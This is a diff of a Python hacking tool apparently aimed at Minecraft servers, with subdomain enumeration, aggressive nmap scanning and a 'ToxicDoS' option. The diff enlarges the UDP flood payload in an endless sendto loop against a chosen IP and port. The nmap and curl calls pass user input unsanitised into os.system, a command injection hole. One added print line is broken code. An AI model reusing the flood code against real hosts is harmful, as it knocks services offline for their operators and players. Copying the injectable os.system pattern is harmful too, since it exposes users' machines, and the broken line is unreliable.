@@ -1,8 +1,6 @@
 import socket
-import subprocess
 import os
 import sys
-from threading import Thread
 import time
 from mcstatus import MinecraftServer
 from colorama import *
@@ -42,7 +40,7 @@ def mainMenu():
     print("[3] Nmap Tracker")
     print("[4] IP Info")
     print("[5] ServerStatus)")
-    print("[6] ToxicDDoS")
+    print("[6] ToxicDoS")
     print("[7] SQLI Checker")
     print(Fore.RED)
     print("[9] Script made by xIsm4")
@@ -99,6 +97,7 @@ def subdomain():
     print("--- Subdomains of " + domain + " ---")
     print(Fore.YELLOW)
 
+    #Well yeah it was 2018 when i coded this tool don't cry.
     subdomains = ["www", "build", "web", "dev", "staff", "mc", "play", "sys", "node1", "node2", "node3", "builder", "developer", "test", "test1", "forum", "bans", "baneos", "ts", "ts3", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "server", "help", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "cdn", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeals", "appeal", "store-assets"]
     for subdomain in subdomains:
         try:
@@ -119,11 +118,11 @@ def toxicdos():
     print("Starting...")
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(9000)
+    bytes = random._urandom(13000)
 
     clear()
 
-    print("Ddos started. Press CTRL + C to cancel")
+    print("Byte-Thread started. Press CTRL + C to cancel")
     while True:
         try:
             sock.sendto(bytes, (ip, port))
@@ -165,7 +164,8 @@ def tracker():
 
     clear()
 
-    os.system ("nmap -p 1-12,1000-1010,20000-20005,25500-25600,28010-28015,30000-30005,40000-40010,65500-65535 -T5 -v -A -Pn " + result)
+#Ngl, mc normaly you just need from udp to minecraft protocol (1900-20000)
+    os.system ("nmap -p 1-65535 -T4 -A -v " + result)
 
     back()
 
@@ -177,6 +177,7 @@ def ipinfo():
     print("--- Info of " + ip + " ---")
     print()
 
+#Yeah u will need a Kernel based for this
     os.system("curl ipinfo.io/" + ip)
 
     print()
@@ -202,6 +203,7 @@ def serverstatus():
     print()
 
     print("Motd: ", end="")
+    print("Proxy:" + + server.brand.name)
     print(status.description)
     print("Players: " + str(status.players.online) + "/" + str(status.players.max))
     print("Version: " + status.version.name)
